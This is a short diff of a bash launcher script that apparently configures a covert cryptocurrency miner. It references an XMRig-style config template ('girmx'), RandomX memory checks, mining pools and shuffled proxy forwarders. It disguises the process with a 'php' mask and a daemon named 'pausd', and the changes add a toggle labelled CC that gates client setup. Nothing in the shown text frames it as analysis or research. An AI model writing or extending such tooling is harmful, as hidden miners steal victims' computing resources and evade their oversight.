@@ -1,9 +1,10 @@
 #!/bin/bash
 
 ## object config
-OBJ_MASK="${OBJ_MASK:-php}"
-DAEMON="${DAEMON:-pausd}"
-DAEMON_NAME="${DAEMON##* }"
+OBJ_MASK=${OBJ_MASK:-php}
+DAEMON=${DAEMON:-pausd}
+DAEMON_NAME=${DAEMON##* }
+CC_ENABLED=${CC_ENABLED:-0}
 if [ -z "$TNL_SKIP" -o "$TNL_SKIP" = 1 ]; then
     # OBJ_CFG="${OBJ_CFG:-girmx_tnl_skip.1.json.tpl}"
     OBJ_CFG="${OBJ_CFG:-girmx_2.json.tpl}"
@@ -64,12 +65,12 @@ fi
 
 # memory
 get_mem
-if [ "$FREEMEM" -lt 256 ]; then
+if [ "$FREEMEM" -lt 1024 ]; then
     RX_INIT=false
     RX_ENABLED=false
 else
     RX_INIT=-1
-    RX_ENABLED=true
+    RX_ENABLED=${RX_ENABLED:-true}
 fi
 
 ## cpu
@@ -199,6 +200,7 @@ POOL
     config_pools 0
     function config_client(){
         ## only first setup
+        [ "$CC_ENABLED" -eq 0 ] && return
         if [ "$1" = 0 ]; then
             x_fwds_file="net/x_forwarders"
             export x_fwds=$(ushuffle $x_fwds_file)
